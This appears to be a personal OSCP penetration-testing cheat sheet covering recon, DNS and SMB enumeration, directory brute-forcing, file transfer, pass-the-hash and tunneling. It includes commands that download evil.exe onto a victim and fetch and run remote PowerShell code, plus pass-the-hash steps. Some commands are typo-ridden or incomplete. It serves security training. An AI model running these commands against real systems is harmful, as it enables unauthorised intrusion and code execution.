# OSCP Notes

------------------------------------------------------------

Recon:
------------------------------------------

nmap -sC -sV -oA nmap/"host" <IP>

nmap -Pn -p- --open -v <IP>

nmap --script vuln -p <PORTS> <IP>

**DNS Enumeration:**
------------------------------------------

host -t ns/mx <domain name.com>

Forward DNS lookup:
------------------------------------------

for name in $(cat list.txt);do
    host $name.DOMAIN.com |grep "has address" |cut -d" " -f1,4
done

Reverse DNS lookup:
------------------------------------------

for ip in $(seq 1 254);do
    host 10.11.1.$ip |grep "domain" |cut -d" " -f1,5
done

DNS zone Transfer:
------------------------------------------

host -l <DOMAIN NAME> <NAME SERVER>


SMTP User Enumeration:
------------------------------------------

See /opt/scripts for vrfy.py

Directory brute-force:
------------------------------------------

gobuster dir -u http:// -w /usr/share/seclist/Discovery/Web-Content/common.txt -t50 (-k to ignore ssl)

gobuster dir -u http:// -w /usr/share/wordlist/dirbuster/directory-list2.3-medium -t50 (-k to ignore ssl)


File transfer methods:
------------------------------------------

cscript wget.vbs(Echo the file to the victim machine) http://10.1.2.111:8000/evil.exe evil.exe

IEX(New-Object Net.Webclient)downloadString(http://x.x.x.x/file)


SMB
------------------------------------------

smbclient -L <IP> # to list shares

smbclient //x.x.x.x/sharename # to log into the share

smbmap -H <IP> # to list shares and display read/write permissions.

PASS The HASH
------------------------------------------

1 .Take the NTLM hash and export it as:

export SMBHASH=<<<<<<<<<<<<<<NTLM_HASH_HERE>>>>>>>>>>>>>>>>>>

2 .run the command:

pth-winexe -U <USER> % //x.x.x.x cmd
    

Tunneling
------------------------------------------

Windows Tunneling via plink:

plinl <REMOTE_USER> -pw <REMOTE_PASSWORD> -R <REMOTE_PORT>








    




